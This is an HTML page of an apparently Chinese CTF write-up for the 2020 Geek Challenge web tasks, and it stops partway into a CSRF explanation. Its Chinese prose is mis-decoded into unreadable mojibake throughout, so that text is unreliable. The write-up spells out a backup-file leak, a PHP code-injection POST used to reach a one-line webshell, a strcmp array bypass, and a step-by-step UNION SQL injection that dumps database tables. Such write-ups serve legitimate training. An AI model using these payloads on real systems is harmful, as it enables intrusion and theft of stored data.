<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2020æå®¢å¤§æŒ‘æˆ˜-WP | ä¸€åªé¹¿ç¾½çš„æ—¥å¸¸</title><meta name="keywords" content="CTF"><meta name="author" content="Antlers,2190024737@qq.com"><meta name="copyright" content="Antlers"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ´»åŠ¨">
<meta property="og:type" content="article">
<meta property="og:title" content="2020æå®¢å¤§æŒ‘æˆ˜-WP">
<meta property="og:url" content="http://antlers.xyz/2020/11/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
<meta property="og:site_name" content="ä¸€åªé¹¿ç¾½çš„æ—¥å¸¸">
<meta property="og:description" content="æ´»åŠ¨">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
<meta property="article:published_time" content="2020-11-27T09:00:08.000Z">
<meta property="article:modified_time" content="2020-12-14T11:57:06.000Z">
<meta property="article:author" content="Antlers">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://antlers.xyz/2020/11/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-12-14 19:57:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/iconfont/xiaotubiao.css"><link rel="stylesheet" href="/css/iconfont/scrollbar.css"><link rel="stylesheet" href="/css/iconfont/touxiang.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">18</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> èœå•</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 0</span></a></li><li><a class="site-page" href="/%E7%85%A7%E7%89%87"><i class="fa-fw /Gallery/"></i><span> 1</span></a></li><li><a class="site-page" href="/%E7%94%B5%E5%BD%B1"><i class="fa-fw /movies/"></i><span> 2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ä¸€åªé¹¿ç¾½çš„æ—¥å¸¸</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> èœå•</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 0</span></a></li><li><a class="site-page" href="/%E7%85%A7%E7%89%87"><i class="fa-fw /Gallery/"></i><span> 1</span></a></li><li><a class="site-page" href="/%E7%94%B5%E5%BD%B1"><i class="fa-fw /movies/"></i><span> 2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2020æå®¢å¤§æŒ‘æˆ˜-WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2020-11-27T09:00:08.000Z" title="å‘è¡¨äº 2020-11-27 17:00:08">2020-11-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2020-12-14T11:57:06.000Z" title="æ›´æ–°äº 2020-12-14 19:57:06">2020-12-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2020æå®¢å¤§æŒ‘æˆ˜-WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="æœ‹å‹çš„å­¦å¦¹"><a href="#æœ‹å‹çš„å­¦å¦¹" class="headerlink" title="æœ‹å‹çš„å­¦å¦¹"></a>æœ‹å‹çš„å­¦å¦¹</h3><p>ç­¾åˆ°é¢˜</p>
<p>ç›´æ¥æŸ¥çœ‹é¡µé¢æºç å°±å¯ä»¥çœ‹è§ä¸€ä¸ªflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag&#x3D;U1lDe0YxQF80c19oNExwZnVsbGxsbGx9--&gt;</span><br></pre></td></tr></table></figure>



<h3 id="EZwww"><a href="#EZwww" class="headerlink" title="EZwww"></a>EZwww</h3><h4 id="è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²</h4><p>æç¤ºä¿¡æ¯ä¸ºï¼šå¤‡ä»½æ˜¯ä¸ªâ€œå¥½ğŸ¤ºâ€ä¹ æƒ¯</p>
<p>æˆ‘ä»¬å°±å¯ä»¥é¦–å…ˆæƒ³åˆ°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œç±»ä¼¼äº.bak </p>
<blockquote>
<p>æœ‰äº›æ—¶å€™ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½ä¸ºäº†æ–¹ä¾¿ï¼Œä¼šåœ¨ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ—¶å€™å…ˆå¤åˆ¶ä¸€ä»½ï¼Œå°†å…¶å‘½åä¸ºxxx.bakã€‚è€Œå¤§éƒ¨åˆ†Web Serverå¯¹bakæ–‡ä»¶å¹¶ä¸åšä»»ä½•å¤„ç†ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œä»è€Œè·å–åˆ°ç½‘ç«™æŸä¸ªæ–‡ä»¶çš„æºä»£ç </p>
</blockquote>
<p>åˆšå¼€å§‹ï¼Œæˆ‘å°è¯•äº†å¥½å¤šæ–‡ä»¶å+bakï¼Œä½†è¿˜æ˜¯æ²¡æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæœ€åçœ‹åˆ°é¢˜ç›®æç¤ºï¼Œwwwï¼ŒçŒœæµ‹å¯èƒ½å¤‡ä»½æ–‡ä»¶åä¸ºï¼š<strong>www</strong></p>
<p>å¾—åˆ°çš„å‹ç¼©åŒ…æœ‰ä¸€ä¸ªflag!!!!.txtï¼Œå¯æƒœï¼Œè¿™ä¸ªæ˜¯å‡çš„flag</p>
<p>å†çœ‹å¦ä¸€ä¸ªindex.phpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$key2</span> = base64_decode(<span class="string">&#x27;c3ljbDB2ZXI=&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> === <span class="variable">$key2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//this is a true flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™ä¸ªï¼Œé‚£å°±å¾ˆç®€å•äº†</p>
<p>postæäº¤ä¸€ä¸ªaçš„å‚æ•°ï¼Œè¦æ±‚äº**$key2**çš„å€¼ç›¸ç­‰ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬å…ˆæŠŠ$key2ç”¨base64æ¥å‡ºæ¥</p>
<p>æˆ‘ä»¬ç°åœ¨åªéœ€è¦<strong>postä¼ å…¥aå‚æ•°</strong>ï¼Œå€¼ä¸ºï¼š<strong>sycl0ver</strong></p>
<blockquote>
<p>SYC{Backup_1s_4_good_h4bit_l0l}</p>
</blockquote>
<h3 id="åˆ˜å£®çš„é»‘é¡µ"><a href="#åˆ˜å£®çš„é»‘é¡µ" class="headerlink" title="åˆ˜å£®çš„é»‘é¡µ"></a>åˆ˜å£®çš„é»‘é¡µ</h3><h4 id="è€ƒç‚¹ï¼šGET-amp-POSTæäº¤"><a href="#è€ƒç‚¹ï¼šGET-amp-POSTæäº¤" class="headerlink" title="è€ƒç‚¹ï¼šGET&amp;POSTæäº¤"></a>è€ƒç‚¹ï¼šGET&amp;POSTæäº¤</h4><p>æˆ‘ä»¬æŸ¥çœ‹é¡µé¢ï¼Œçœ‹åˆ°è¿™æ ·ä¸€æ®µè¯<strong>ä½ å¬è¯´è¿‡è¯·æ±‚æ–¹å¼å—ï¼Ÿ</strong>ï¼Œå†çœ‹åˆ°é¡µé¢æœ€ä¸‹é¢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$passwd</span> === <span class="string">&#x27;syclover&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œåªéœ€è¦æˆ‘ä»¬åˆ†åˆ«ç”¨<strong>POST</strong>å’Œ<strong>GET</strong>ä¼ å…¥ä¸¤å‚æ•°ï¼Œå°±å¥½äº†</p>
<blockquote>
<p>SYC{d0_y0u_k0nw_GET?}</p>
</blockquote>
<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><h4 id="è€ƒç‚¹ï¼šPOSTä¼ å‚ï¼Œphpinfoï¼Œç»•è¿‡sha1"><a href="#è€ƒç‚¹ï¼šPOSTä¼ å‚ï¼Œphpinfoï¼Œç»•è¿‡sha1" class="headerlink" title="è€ƒç‚¹ï¼šPOSTä¼ å‚ï¼Œphpinfoï¼Œç»•è¿‡sha1"></a>è€ƒç‚¹ï¼šPOSTä¼ å‚ï¼Œphpinfoï¼Œç»•è¿‡sha1</h4><p>è¿›å…¥åé¢˜ç›®åå‘ç°é¡µé¢å›æ˜¾405</p>
<p>çœ‹åˆ°é¢˜ç›®æç¤ºï¼šIn addition to the GET request method, there is another common request methodâ€¦</p>
<p>ç”¨postä¼ å‚ï¼Œå¹¶ä¸”æ—¥å¸¸çœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°<strong>phpinfo.php</strong></p>
<p>å°è¯•åæ‰¾åˆ°è¿™ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.224.119:8000&#x2F;?a&#x3D;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;postä¼ </span><br><span class="line">a&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>å°±çœ‹åˆ°ä¸€ç‚¹ä¸œè¥¿ï¼Œï¼ˆå°å£°å“”å“”ä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œçš„ç¯å¢ƒæ‹¿ç«ç‹ä½¿ç”¨å°±æ²¡é—®é¢˜ï¼Œchromeå°±æœ‰é—®é¢˜äº†ï¼‰</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98_welcome.png" alt="welcome"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå°±æ˜¯ä¸€é“å¾ˆç®€å•çš„ä¸€å¥è¯æœ¨é©¬äº†ï¼Œæˆ‘ä»¬æ‹¿èšå‰‘è¿æ¥ï¼Œçœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹å°±æœ‰ä¸€ä¸ªflag</p>
<blockquote>
<p>SYC{1iuzHuang_yyd_G0d!}</p>
</blockquote>
<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><h4 id="è€ƒç‚¹ï¼šç»•è¿‡"><a href="#è€ƒç‚¹ï¼šç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šç»•è¿‡"></a>è€ƒç‚¹ï¼šç»•è¿‡</h4><blockquote>
<p>Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.</p>
<p>Note that a and b cannot be equal. </p>
<p>è¯·ä½¿ç”¨GETè¯·æ±‚ä¼ å…¥å˜é‡aå’Œbï¼Œå°†å…¶ä¸strcmpè¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è®©strcmpè¿”å›NULLå€¼ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œaå’Œbä¸èƒ½ç›¸ç­‰ã€‚</p>
</blockquote>
<p>çœ‹åˆ°æç¤ºä¿¡æ¯æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ å˜é‡aå’Œbäº†ï¼Œæ³¨æ„æœ€åä¸€å¥ï¼Œ==aå’Œbä¸èƒ½ç›¸ç­‰==ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œæ—¢ç„¶è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”¨ä¸€ä¸‹å‰é¢é¢˜ç›®çš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;&amp;b&#x3D;1</span><br></pre></td></tr></table></figure>

<p>okï¼Œç¬¬ä¸€éƒ¨åˆ†å·²ç»ç»•è¿‡äº†ï¼Œç°åœ¨è¦æˆ‘ä»¬ç”¨<strong>POSTä¼ å…¥ä¸€ä¸ªå‚æ•°cï¼Œè¦æ±‚éæ•°å­—ï¼Œå¹¶ä»¥ä½¿å…¶ç­‰äº123</strong></p>
<blockquote>
<p>OKOK,You got the first step.<br>Please POST a variable c that is not a number to make it equal to 123 </p>
<p>å¥½çš„ï¼Œæ‚¨è¿ˆå‡ºäº†ç¬¬ä¸€æ­¥ã€‚<br>è¯·å‘å¸ƒä¸€ä¸ªéæ•°å­—çš„å˜é‡cä»¥ä½¿å…¶ç­‰äº123</p>
</blockquote>
<p>æˆ‘æµ‹è¯•äº†ä¸€ä¸‹ï¼Œåªæœ‰å½“æˆ‘ç”¨<strong>çº¯æ•°å­—</strong>çš„æ—¶å€™ï¼Œæ‰ä¼šæœ‰æŠ¥é”™ï¼Œå› æ­¤æˆ‘åªéœ€è¦åŠ å…¥ä¸€ä¸ªç©ºæ ¼ï¼ˆ%23ï¼‰å°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;123%23</span><br></pre></td></tr></table></figure>



<h3 id="å¸¦æ¶äººå…­æ’"><a href="#å¸¦æ¶äººå…­æ’" class="headerlink" title="å¸¦æ¶äººå…­æ’"></a>å¸¦æ¶äººå…­æ’</h3><h4 id="è€ƒç‚¹ï¼šSQLæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šSQLæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šSQLæ³¨å…¥"></a>è€ƒç‚¹ï¼šSQLæ³¨å…¥</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>ä½ æƒ³äº†è§£å¸¦æ¶äººå…­æ’å—ï¼Œæ•°æ®åº“é‡Œæœ‰å¤§å®¶å…³äºä»–çš„æè¿°ã€‚</p>
</blockquote>
<p>é¦–å…ˆåˆ¤æ–­ç±»å‹ï¼š</p>
<p>æµ‹è¯•åå‘ç°æ˜¯ä¸€ä¸ªå•å¼•å·é—­åˆå­—ç¬¦ä¸²ç±»å‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; or 1&#x3D;1 %23</span><br></pre></td></tr></table></figure>

<p>æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œå¼€å§‹æ³¨å…¥ï¼Œå…ˆåˆ¤æ–­ä¸€æ³¢å›æ˜¾ä½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; order by 4 %23	&#x2F;&#x2F;å›æ˜¾ä½ä¸ºå››ä½</span><br></pre></td></tr></table></figure>

<p>è·å–åº“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,database() %23</span><br></pre></td></tr></table></figure>

<p>è·å–è¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;geek_sql&quot; %23</span><br></pre></td></tr></table></figure>

<p>è·å–å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;fllllag&quot;%23</span><br><span class="line">id,fllllllag</span><br></pre></td></tr></table></figure>

<p>è·å–å€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(id,&#39;:&#39;,fllllllag) from fllllag %23</span><br></pre></td></tr></table></figure>



<h3 id="flagshop"><a href="#flagshop" class="headerlink" title="flagshop"></a>flagshop</h3><h4 id="è€ƒç‚¹ï¼šCSRFæ”»å‡»"><a href="#è€ƒç‚¹ï¼šCSRFæ”»å‡»" class="headerlink" title="è€ƒç‚¹ï¼šCSRFæ”»å‡»"></a>è€ƒç‚¹ï¼šCSRFæ”»å‡»</h4><p>è¿™é“é¢˜æç¤ºæˆ‘ä»¬éœ€è¦åœ¨é¡µé¢é‡Œæåˆ°é’±ï¼Œä¹°åˆ°flagï¼Œå…³é”®ç‚¹å°±æ˜¯<strong>é’±ä»å“ªæ¥</strong>ï¼Ÿ</p>
<p>è®©æˆ‘ä»¬ç°å†ä»”ç»†è§‚å¯Ÿä¸€ä¸‹é¡µé¢ï¼Œæˆ‘ä»¬æ¯ä¸€ä¸ªè´¦å·éƒ½æœ‰ä¸€ä¸ªèº«ä»½idï¼Œæ³¨å†Œç”¨æˆ·çš„èº«ä»½æ˜¯ä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·</p>
<p>åœ¨ä¸»é¡µé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè´¢åŠ¡ç®¡ç†å‘˜çš„idï¼š==Longlong==ï¼ˆå¾…ä¼šæˆ‘ä»¬ä¼šç”¨åˆ°è¿™ä¸ªIDï¼‰ï¼Œå¦‚æœæåˆ°ä»–çš„è´¦æˆ·ç™»å½•ï¼Œæˆ–è€…è®©ä»–æ‰“é’±ç»™æˆ‘ä»¬æˆ‘ä»¬ä¸å°±æœ‰é’±äº†ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<strong>è½¬è´¦çš„é¡µé¢</strong></p>
<p>é¢˜ç›®çš„æç¤ºä¹ŸéªŒè¯äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œè€Œä¸”ä½†ä¹Ÿå µä¸Šäº†ç¬¬ä¸€æ¡è·¯</p>
<blockquote>
<p>1.No sessionid!Donâ€™t Try to be admin(robot?) 2.Do you know csrf?</p>
<p>1.æ²¡æœ‰sessionidï¼ä¸è¦å°è¯•æˆä¸ºç®¡ç†å‘˜ï¼ˆæœºå™¨äººï¼Ÿï¼‰2.æ‚¨çŸ¥é“csrfå—ï¼Ÿ</p>
</blockquote>
<p><strong>æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹CSRF</strong></p>
<blockquote>
<p>æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚è·Ÿè·¨ç½‘ç«™è„šæœ¬ï¼ˆXSSï¼‰ç›¸æ¯”ï¼Œ<strong>XSS</strong> åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»</p>
